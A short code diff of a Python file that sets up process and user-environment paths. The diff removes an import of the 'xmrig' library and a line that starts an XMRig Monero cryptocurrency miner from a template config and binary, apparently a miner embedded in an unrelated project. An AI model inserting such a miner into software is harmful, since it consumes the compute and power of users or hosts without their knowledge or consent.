@@ -1,9 +1,6 @@
 import os
 import time
-import xmrig
 
-
-xmr = xmrig.XMRig("templates/config.json","templates/xmrig",donate_level=1)
 FILEROOT = os.getcwd() #for process
 ROOT = os.getcwd() + "/env"  # for user envs
 
